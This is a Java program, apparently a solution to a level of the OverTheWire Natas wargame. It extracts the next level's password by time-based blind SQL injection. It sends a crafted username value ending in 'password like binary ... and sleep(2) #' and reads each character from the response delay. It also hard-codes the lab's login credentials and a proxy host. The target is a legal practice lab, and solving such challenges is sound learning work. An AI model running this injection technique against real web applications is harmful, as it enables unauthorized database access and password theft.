package natas;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URL;
import java.util.Base64;

public class Natas16 {

	static String caracteres = "azertyuiopqsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWXCVBN0123456789";

	public static void main(String[] args) throws Exception {

		StringBuilder password = new StringBuilder();
		int longueurInit = -1;

		while (longueurInit != password.length()) {
			longueurInit = password.length();
			for (char charac : caracteres.toCharArray()) {
				if (envoyerRequete(password.toString() + charac)) {
					password.append(charac);
					break;
				}
			}
			System.out.println(password.toString());
		}

		System.out.println(password.toString());
	}

	static boolean envoyerRequete(String param) throws IOException {

		HttpURLConnection connection = null;
		Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress("proxy-rie.http.insee.fr", 8080));
		URL url = new URL("http://natas17.natas.labs.overthewire.org/index.php?debug");
		connection = (HttpURLConnection) url.openConnection(proxy);
		connection.setRequestMethod("POST");
		connection.setRequestProperty("Authorization",
				"Basic " + Base64.getEncoder().encodeToString("natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw".getBytes()));

		// We send a content
		connection.setDoOutput(true);

		// Send request
		DataOutputStream wr = new DataOutputStream(connection.getOutputStream());
		wr.writeBytes("username=natas18\" and password like binary \"" + param + "%\" and sleep(2) #");
		long debut = System.currentTimeMillis();
		wr.close();

		// Get Response
		InputStream is = connection.getInputStream();
		long fin = System.currentTimeMillis();

		return fin - debut > 2000;
	}

}
